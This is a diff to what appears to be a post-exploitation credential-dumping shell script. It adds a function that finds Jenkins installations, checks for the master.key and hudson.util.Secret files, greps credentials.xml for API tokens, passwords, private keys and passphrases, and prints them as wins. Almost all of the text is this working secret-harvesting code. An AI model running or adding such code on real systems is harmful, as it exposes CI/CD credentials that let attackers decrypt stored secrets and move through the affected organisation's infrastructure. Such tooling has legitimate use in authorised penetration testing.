@@ -325,6 +325,23 @@ _dump_tomcat() {
 	done
 }
 
+_dump_jenkins() {
+	for jenkinshome in "/home/jenkins/" "/var/lib/jenkins/"
+	do
+		if [[ -d $jenkinshome && -f "$jenkinshome/secrets/master.key" && -f "$jenkinshome/secrets/hudson.util.Secret" ]]
+		then
+			possible_secrets=$(grep -i "<apitoken>\|<password>\|<privatekey>\|<passphrase>" "$jenkinshome/credentials.xml")
+			if [ ${#possible_secrets} -gt 0 ]
+			then
+				_print_win "$jenkinshome/secrets/master.key" "Jenkins master key"
+				_print_win "$jenkinshome/secrets/hudson.util.Secret" "Hudson secret"
+				_print_win "$jenkinshome/credentials.xml" "$possible_secrets"
+			fi
+		fi
+	done
+}
+
+
 ##########################################################
 # internal functions
 RESTORE=$(echo -en '\033[0m')
@@ -471,6 +488,7 @@ _paragraph "WEB APPS!"
 _dump_wordpress
 _dump_drupal
 _dump_tomcat
+_dump_jenkins
 #Add Directory Alias apache config?
 #if we found locatedb, should we use it?
 #.yml files (symphony) => credz config.yml or parameters.yml
